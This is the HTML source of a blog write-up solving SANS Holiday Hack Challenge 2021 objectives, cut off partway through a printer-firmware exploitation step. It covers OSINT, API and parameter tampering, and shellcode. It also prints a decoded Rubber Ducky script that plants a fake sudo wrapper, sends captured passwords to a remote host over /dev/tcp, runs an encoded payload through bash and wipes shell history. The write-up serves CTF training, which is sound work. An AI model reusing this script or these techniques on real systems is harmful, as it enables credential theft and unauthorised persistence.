@@ -1,0 +1,664 @@
+<!doctype html><html lang=en-us><head><title>SANS Holiday Hack Challenge 2021 | Nikola's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Blog about Cybersecurity, CTF Writeups and stuff"><meta name=generator content="Hugo 0.80.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-156479490-3','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><nav class=navigation><a href=/><span class=arrow>←</span>Home</a>
+<a href=/posts>Archive</a>
+<a href=/tags>Tags</a>
+<a href=/about>About</a>
+<a class=button href=https://knez.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>SANS Holiday Hack Challenge 2021</h1><div class=tip><span>Jan 8, 2022 13:07</span>
+<span class=split>·</span>
+<span>7896 words</span>
+<span class=split>·</span>
+<span>38 minute read</span></div><div class=content><h2>Table of Contents</h2><div id=toc><nav id=TableOfContents><ul><li><a href=#objectives>Objectives</a><ul><li><a href=#objective-1---kringlecon-orientation>Objective 1 - KringleCon Orientation</a></li><li><a href=#objective-2---where-in-the-world-is-caramel-santaigo>Objective 2 - Where in the World is Caramel Santaigo?</a></li><li><a href=#objective-3---thaw-frost-towers-entrance>Objective 3 - Thaw Frost Tower&rsquo;s Entrance</a></li><li><a href=#objective-4---slot-machine-investigation>Objective 4 - Slot Machine Investigation</a></li><li><a href=#objective-5---strange-usb-device>Objective 5 - Strange USB Device</a></li><li><a href=#objective-6---shellcode-primer>Objective 6 - Shellcode Primer</a></li><li><a href=#objective-7---printer-exploitation>Objective 7 - Printer Exploitation</a></li><li><a href=#objective-8---kerberoasting-on-an-open-fire>Objective 8 - Kerberoasting on an Open Fire</a></li><li><a href=#objective-9---splunk>Objective 9 - Splunk!</a></li><li><a href=#objective-10---now-hiring>Objective 10 - Now Hiring!</a></li><li><a href=#objective-11---customer-complaint-analysis>Objective 11 - Customer Complaint Analysis</a></li><li><a href=#objective-12---frost-tower-website-checkup>Objective 12 - Frost Tower Website Checkup</a></li><li><a href=#objective-13---fpga-programming>Objective 13 - FPGA Programming</a></li></ul></li><li><a href=#terminals>Terminals</a><ul><li><a href=#terminal-1---open-the-gate>Terminal 1 - Open the Gate</a></li><li><a href=#terminal-2---document-analysis>Terminal 2 - Document Analysis</a></li><li><a href=#terminal-3---grepping-for-gold>Terminal 3 - Grepping for Gold</a></li><li><a href=#terminal-4---logic-munchers>Terminal 4 - Logic Munchers</a></li><li><a href=#terminal-5---ipv6-sandbox>Terminal 5 - IPv6 Sandbox</a></li><li><a href=#terminal-6---hoho--no>Terminal 6 - HoHo &mldr; No</a></li><li><a href=#terminal-7---yara-analysis>Terminal 7 - Yara Analysis</a></li><li><a href=#terminal-8---imds-exploration>Terminal 8 - IMDS Exploration</a></li><li><a href=#terminal-9---elf-code-python>Terminal 9 - Elf Code Python</a></li><li><a href=#terminal-10---strace-ltrace-retrace>Terminal 10 - Strace Ltrace Retrace</a></li><li><a href=#terminal-11---frostavator>Terminal 11 - Frostavator</a></li><li><a href=#terminal-12---holiday-hero>Terminal 12 - Holiday Hero</a></li></ul></li></ul></nav></div><h1 id=objectives>Objectives <a href=#objectives class=anchor>🔗</a></h1><h2 id=objective-1---kringlecon-orientation>Objective 1 - KringleCon Orientation <a href=#objective-1---kringlecon-orientation class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Get your bearings at KringleCon</em></p><p>The first objective was intentionally simple. It was all about getting started. Pick up the badge and wifi dongle laying around, talk to Jingle Ringford and complete the <a href=#terminal-1---open-the-gate>first</a> terminal challenge.</p><h2 id=objective-2---where-in-the-world-is-caramel-santaigo>Objective 2 - Where in the World is Caramel Santaigo? <a href=#objective-2---where-in-the-world-is-caramel-santaigo class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Help Tangle Coalbox find a wayward elf in Santa&rsquo;s courtyard. Talk to Piney Sappington nearby for hints.</em></p><p><p class=markdown-image><img src=/images/kringlecon-2021/santiago.jpg alt=santiago></p></p><p>This is a game about Open Source Intelligence (OSINT). The goal is to track down the elf by making use of information provided from the hints. We start at location Santa&rsquo;s Castle and each time we get 3 investigation hints. From these we can deduce the next location where the elf went. If we get a very specific clue, we can narrow down the possible elves using <code>InterRink portal</code>.</p><p>First destination: <strong>Santa&rsquo;s Castle</strong></p><p>Investigation hints:</p><ul><li>They were excited about checking out the Vánoční trhy.</li><li>They said something about NATO and 33U VR 58560 48464.</li><li>They kept checking their Slack app</li></ul><p>Vánoční trhy translates to Christmas markets in Czech. The provided geocoordinates are in the MGRS format, which is the standard used by NATO. It points to Prague. Finally, entering clue about Slack usage in the <code>InterRink</code> portal gives the following candidates:</p><ul><li>Morcel Nougat</li><li>Ginger Breddie</li><li>Ribb Bonbowford</li></ul><p>Next destination: <strong>PRAGUE, CZECH REPUBLIC</strong></p><p>Investigation hints:</p><ul><li>Their next waypoint was something like 51.219, 4.402</li><li>They just contacted us from an address in the 81.244.0.0/14 range.</li><li>The elf mentioned something about Stack Overflow and C#.</li></ul><p>First clue is a pair of Latitude and Longitude coords which point to Antwerp, Belgium. The second hint is an IP address which belongs to a Belgian ISP. Entering C# in the InterRink portal narrows it down to just one candidate:</p><ul><li>Ribb Bonbowford</li></ul><p>Next destination: <strong>ANTWERP, BELGIUM</strong></p><p>Investigation hints:</p><ul><li>They left to check out the Défilé de Noël.</li><li>They were connected via Rogers Wireless.</li><li>They had a Star Wars themed phone case</li></ul><p>Défilé de Noël is a festival held in Canada. Rogers Wireless is a Canadian telephone company.</p><p>Next destination: <strong>MONTRÉAL, CANADA</strong></p><p>At this point we caught up to elf and need to type in his name</p><p>Answer: <strong>Ribb Bonbowford</strong></p><h2 id=objective-3---thaw-frost-towers-entrance>Objective 3 - Thaw Frost Tower&rsquo;s Entrance <a href=#objective-3---thaw-frost-towers-entrance class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Turn up the heat to defrost the entrance to Frost Tower. Click on the Items tab in your badge to find a link to the Wifi Dongle&rsquo;s CLI interface. Talk to Greasy Gopherguts outside the tower for tips.</em></p><p>First, we need to find a good signal. Move close to the Frost Tower entrance and open up the WiFI dongle interface by clicking on it. The command <code>iwlist scanning</code> will start scanning on interface wlan0.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>elf@3a634569c5c8:~$ iwlist scanning
+wlan0     Scan completed :
+          Cell 01 - Address: 02:4A:46:68:69:21
+                    Frequency:5.2 GHz (Channel 40)
+                    Quality=48/70  Signal level=-62 dBm  
+                    Encryption key:off
+                    Bit Rates:400 Mb/s
+                    ESSID:&#34;FROST-Nidus-Setup&#34;
+</code></pre></div><p>One open network was found. We can connect to it using <code>iwconfig</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ iwconfig wlan0 essid &#34;FROST-Nidus-Setup&#34;
+** New network connection to Nidus Thermostat detected!
+Visit http://nidus-setup:8080/ to complete setup
+(The setup is compatible with the &#39;curl&#39; utility)
+</code></pre></div><p>Bingo, we connected to Jack&rsquo;s Thermostat.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ curl http://nidus-setup:8080
+Nidus Thermostat Setup
+
+WARNING Your Nidus Thermostat is not currently configured! Access to this
+device is restricted until you register your thermostat » /register. Once you
+have completed registration, the device will be fully activated.
+
+In the meantime, Due to North Pole Health and Safety regulations
+42 N.P.H.S 2600(h)(0) - frostbite protection, you may adjust the temperature.
+</code></pre></div><p>It&rsquo;s telling us we should register the device, however we can&rsquo;t do that, as it requires valid credentials. in the meantime we can adjust the temperature, which is exactly what we want.</p><p>Get the temperature of the cooler</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span>$</span> <span>curl</span> <span>http://nidus-setup:</span><span style=color:#666>8080</span><span>/api/cooler</span>
+{
+  <span style=color:green;font-weight:700>&#34;temperature&#34;</span>: <span style=color:#666>-39.0</span>,
+  <span style=color:green;font-weight:700>&#34;humidity&#34;</span>: <span style=color:#666>11.73</span>,
+  <span style=color:green;font-weight:700>&#34;wind&#34;</span>: <span style=color:#666>11.45</span>,
+  <span style=color:green;font-weight:700>&#34;windchill&#34;</span>: <span style=color:#666>-50.76</span>
+}
+</code></pre></div><p>Set the temperature to 0 to thaw the tower. Use POST request and JSON as a payload</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ curl -X POST -H &#39;Content-Type: application/json&#39; \
+  --data-binary &#39;{&#34;temperature&#34;: 0}&#39; \
+  http://nidus-setup:8080/api/cooler
+</code></pre></div><p>Check the temperature again</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span>$</span> <span>curl</span> <span>http://nidus-setup:</span><span style=color:#666>8080</span><span>/api/cooler</span>
+{
+  <span style=color:green;font-weight:700>&#34;temperature&#34;</span>: <span style=color:#666>0.34</span>,
+  <span style=color:green;font-weight:700>&#34;humidity&#34;</span>: <span style=color:#666>8.07</span>,
+  <span style=color:green;font-weight:700>&#34;wind&#34;</span>: <span style=color:#666>9.55</span>,
+  <span style=color:green;font-weight:700>&#34;windchill&#34;</span>: <span style=color:#666>-2.79</span>,
+  <span style=color:green;font-weight:700>&#34;WARNING&#34;</span>: <span style=color:#b44>&#34;ICE MELT DETECTED!&#34;</span>
+}
+</code></pre></div><h2 id=objective-4---slot-machine-investigation>Objective 4 - Slot Machine Investigation <a href=#objective-4---slot-machine-investigation class=anchor>🔗</a></h2><p><strong>Task:</strong> Test the security of Jack Frost&rsquo;s slot machines. What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa&rsquo;s Castle for help.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/slot-machine.jpg alt="Slot Machine"></p></p><p>The game resembles classic slot machine games. One can spin the slot, increase the bet size or go full on auto-spin. The total credits are shown in the upper left corner. At the beginning we have 100.</p><p>The goal is to gain 1000+ coins by hacking the slot machine. To do so, we&rsquo;re going to use the <a href=https://owasp.org/www-community/attacks/Web_Parameter_Tampering target=_blank rel=noopener>web parameter tampering</a> technique. Let&rsquo;s first examine which data are being sent after each spin. Using Firefox&rsquo;s devtools, in the <code>Networking</code> tab we see a POST request is being sent along with some form data</p><p><p class=markdown-image><img src=/images/kringlecon-2021/request.png alt=request></p></p><p><p class=markdown-image><img src=/images/kringlecon-2021/response.png alt=response></p></p><p>Three parameters are sent upon clicking the spin button (betamount, numline and cpl). It would be handy to change each parameter on the fly, and see what each is doing. Luckily, firefox has a neat builtin feature called <code>Edit & Resend</code> which allows us to resend the previously recorded requests and optionally modify them. After fiddling around for some time, I figured that if <code>numline</code> is changed to <strong>negative</strong> value, it will actually cause the credits to <strong>increase</strong> each time we &ldquo;loose&rdquo;.</p><p>Using the Edit & Resend to change the parameter <code>numline</code> to -1000</p><p><p class=markdown-image><img src=/images/kringlecon-2021/edit-resend.png alt=edit-resend></p></p><p>Response</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:green;font-weight:700>&#34;success&#34;</span>: <span style=color:#a2f;font-weight:700>true</span>,
+  <span style=color:green;font-weight:700>&#34;data&#34;</span>: {
+    <span style=color:green;font-weight:700>&#34;credit&#34;</span>: <span style=color:#666>198</span>,
+    <span style=color:green;font-weight:700>&#34;jackpot&#34;</span>: <span style=color:#666>0</span>,
+    <span style=color:green;font-weight:700>&#34;free_spin&#34;</span>: <span style=color:#666>0</span>,
+    <span style=color:green;font-weight:700>&#34;free_num&#34;</span>: <span style=color:#666>0</span>,
+    <span style=color:green;font-weight:700>&#34;scaler&#34;</span>: <span style=color:#666>0</span>,
+    <span style=color:green;font-weight:700>&#34;num_line&#34;</span>: <span style=color:#666>-1000</span>,
+    <span style=color:green;font-weight:700>&#34;bet_amount&#34;</span>: <span style=color:#666>1</span>,
+    <span style=color:green;font-weight:700>&#34;pull&#34;</span>: { <span>...</span> },
+    <span style=color:green;font-weight:700>&#34;response&#34;</span>: <span style=color:#b44>&#34;Woweee!&#34;</span>
+  },
+  <span style=color:green;font-weight:700>&#34;message&#34;</span>: <span style=color:#b44>&#34;Spin success&#34;</span>
+}
+</code></pre></div><p>We suddenly increased the score to 198. After repeating the steps several times, each time the score will increase and in the <code>response</code> field, we can see Jack&rsquo;s message.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/winning.png alt=winning></p></p><p>After couple more spins, the total amount exceeded 1000 and the final message was revealed.</p><p>Answer: <strong>I&rsquo;m going to have some bouncer trolls bounce you right out of this casino!</strong></p><h2 id=objective-5---strange-usb-device>Objective 5 - Strange USB Device <a href=#objective-5---strange-usb-device class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Assist the elves in reverse engineering the strange USB device. Visit Santa&rsquo;s Talks Floor and hit up Jewel Loggins for advice. What is the troll username involved with this attack?</em></p><p>We are given a firmware <code>inject.bin</code> of a strange usb device. This is a standard binary firmware for the device called <a href=https://hak5.org/products/usb-rubber-ducky-deluxe target=_blank rel=noopener>Rubber Ducky
+</a>. When inserted into the computer, it immediately registers itself as a keyboard, and begins typing a set of predefined commands really fast.</p><p>The <code>inject.bin</code> file can by analyzed with a python script <a href=https://github.com/dagonis/Mallard target=_blank rel=noopener>Mallard
+</a>. It decodes the binary into a user-readable Ducky Script.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ python3 mallard.py -f /mnt/USBDEVICE/inject.bin
+ENTER                                                                                          
+DELAY 1000                                                                                     
+GUI SPACE                                                                                      
+DELAY 500                                                                                      
+STRING terminal                                                                                
+ENTER                                                                                          
+DELAY 500                                                                                      
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+STRING  /bin/bash                                                                              
+ENTER                                                                                          
+DELAY 500
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+GUI -                                                                                          
+STRING  /bin/bash                                                                              
+ENTER                                                                                          
+DELAY 500                                                                                      
+STRING mkdir -p ~/.config/sudo                                                                 
+ENTER                                                                                          
+DELAY 200                                                                                      
+STRING echo &#39;#!/bin/bash &gt; ~/.config/sudo/sudo                                                 
+ENTER                                                                                          
+STRING /usr/bin/sudo $@                                                                        
+ENTER                                                                                          
+STRING echo -n &#34;[sudo] password for $USER: &#34;                                                   
+ENTER                                                                                          
+STRING read -s pwd
+ENTER
+STRING echo
+ENTER
+STRING echo &#34;$pwd&#34; | /usr/bin/sudo -S true 2&gt;/dev/null
+ENTER
+STRING if [ $? -eq 1 ]s
+ENTER
+STRING then
+ENTER
+STRING echo &#34;$USER:$pwd:invalid&#34; &gt; /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo &#34;Sorry, try again.&#34;
+ENTER
+STRING sudo $@
+ENTER
+STRING else
+ENTER
+STRING echo &#34;$USER:$pwd:valid&#34; &gt; /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo &#34;$pwd&#34; | /usr/bin/sudo -S $@
+ENTER
+STRING fi
+ENTER
+STRING fi&#39; &gt; ~/.config/sudo/sudo
+ENTER
+DELAY 200
+STRING chmod u+x ~/.config/sudo/sudo
+ENTER
+DELAY 200
+STRING echo &#34;export PATH=~/.config/sudo:$PATH&#34; &gt;&gt; ~/.bash_profile
+ENTER
+DELAY 200
+STRING echo &#34;export PATH=~/.config/sudo:$PATH&#34; &gt;&gt; ~/.bashrc
+ENTER
+DELAY 200
+STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
+ENTER
+DELAY 600
+STRING history -c &amp;&amp; rm .bash_history &amp;&amp; exit
+ENTER
+DELAY 600
+GUI q
+</code></pre></div><p>This rubber ducky script places a fake sudo wrapper script into <code>.config/sudo</code> folder.
+The fake wrapper runs the legit sudo, but in between captures the user password (both correct and failed attempts) and exfiltrates this data to trollfun.jackfrosttower.com/1337 through tcp.</p><p>Lastly, it establishes persistence by abusing the <a href=https://attack.mitre.org/techniques/T1098/004/ target=_blank rel=noopener>SSH Authorized Keys</a> technique. An entry is added to the <code>~/.ssh/authorized_keys</code> with the hostname trollfun.jackfrosttower.com and username ickymcgoop.</p><p>Answer: <strong>ickymcgoop</strong></p><h2 id=objective-6---shellcode-primer>Objective 6 - Shellcode Primer <a href=#objective-6---shellcode-primer class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Complete the Shellcode Primer in Jack&rsquo;s office. According to the last challenge, what is the secret to KringleCon success? &ldquo;All of our speakers and organizers, providing the gift of ____, free to the community.&rdquo; Talk to Chimney Scissorsticks in the NetWars area for hints.</em></p><p>Shellcode Primer is a set of 11 smaller challenges that progressively increase in difficulty. Each level teaches some basic concept about shellcode/assembly. The final level&rsquo;s task is to read the file <code>/var/northpolesecrets.txt</code> and output it to stdout. All by using just 3 system calls (open, read, and write)</p><p>The following table describes the registers that need to be set in order to use each syscall</p><p><p class=markdown-image><img src=/images/kringlecon-2021/shellcode.png alt=shellcode></p></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#080;font-style:italic>; Get a reference to string
+</span><span style=color:#080;font-style:italic></span><span style=color:#00a000>call</span> <span style=color:#800>get_ref</span>
+<span style=color:#00a000>db</span> <span>&#39;/</span><span style=color:#800>var</span><span>/</span><span style=color:#800>northpolesecrets.txt</span><span>&#39;</span>,<span style=color:#666>0</span>
+<span style=color:#a0a000>get_ref:</span>
+<span style=color:#00a000>pop</span> <span style=color:#800>rbx</span>
+
+<span style=color:#080;font-style:italic>; Call sys_open
+</span><span style=color:#080;font-style:italic></span><span style=color:#00a000>mov</span> <span style=color:#800>rax</span>, <span style=color:#666>2</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rdi</span>, <span style=color:#800>rbx</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rsi</span>, <span style=color:#666>0</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rdx</span>, <span style=color:#666>0</span>
+<span style=color:#00a000>syscall</span>
+
+<span style=color:#080;font-style:italic>; Call sys_read on the file handle and read it into rsp
+</span><span style=color:#080;font-style:italic></span><span style=color:#00a000>mov</span> <span style=color:#800>rdi</span>, <span style=color:#800>rax</span>
+<span style=color:#00a000>sub</span> <span style=color:#800>rsp</span>, <span style=color:#666>200</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rsi</span>, <span style=color:#800>rsp</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rdx</span>, <span style=color:#666>200</span>
+<span style=color:#00a000>xor</span> <span style=color:#800>rax</span>, <span style=color:#800>rax</span>
+<span style=color:#00a000>syscall</span>
+
+<span style=color:#080;font-style:italic>; Call sys_write to write the contents from rsp to stdout (1)
+</span><span style=color:#080;font-style:italic></span><span style=color:#00a000>mov</span> <span style=color:#800>rdx</span>, <span style=color:#800>rax</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rdi</span>, <span style=color:#666>1</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rsi</span>, <span style=color:#800>rsp</span>
+<span style=color:#00a000>mov</span> <span style=color:#800>rax</span>, <span style=color:#666>1</span>
+<span style=color:#00a000>syscall</span>
+
+<span style=color:#080;font-style:italic>; Restore stack and return
+</span><span style=color:#080;font-style:italic></span><span style=color:#00a000>add</span> <span style=color:#800>rsp</span>, <span style=color:#666>200</span>
+<span style=color:#00a000>xor</span> <span style=color:#800>rax</span>, <span style=color:#800>rax</span>
+<span style=color:#00a000>ret</span>
+</code></pre></div><p>After running the above code inside the provided simulator, we see the process has exited cleanly, and the contents of the file are ouput to stdout.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/shellcode-output.png alt=shellcode2></p></p><p>Answer: <strong>cyber security knowledge</strong></p><h2 id=objective-7---printer-exploitation>Objective 7 - Printer Exploitation <a href=#objective-7---printer-exploitation class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Investigate the stolen Kringle Castle printer. Get shell access to read the contents of /var/spool/printer.log. What is the name of the last file printed (with a .xlsx extension)? Find Ruby Cyster in Jack&rsquo;s office for help with this objective.</em></p><p>The vulnerable printer page looks like this</p><p><p class=markdown-image><img src=/images/kringlecon-2021/printer.png alt=printer></p></p><p>We can upload new firmware and insert our malicious code, but there is a catch. The firmware needs to be signed, otherwise the web app will reject it.
+We can bypass this requirement by utilising an hash extension attack. More on it later.</p><p>For now, let&rsquo;s download the current firmware and inspect it.</p><h3 id=analyzing-firmware><strong>Analyzing firmware</strong> <a href=#analyzing-firmware class=anchor>🔗</a></h3><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:green;font-weight:700>&#34;firmware&#34;</span>: <span style=color:#b44>&#34;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&#34;</span>,
+  <span style=color:green;font-weight:700>&#34;signature&#34;</span>: <span style=color:#b44>&#34;2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97&#34;</span>,
+  <span style=color:green;font-weight:700>&#34;secret_length&#34;</span>: <span style=color:#666>16</span>,
+  <span style=color:green;font-weight:700>&#34;algorithm&#34;</span>: <span style=color:#b44>&#34;SHA256&#34;</span>
+}
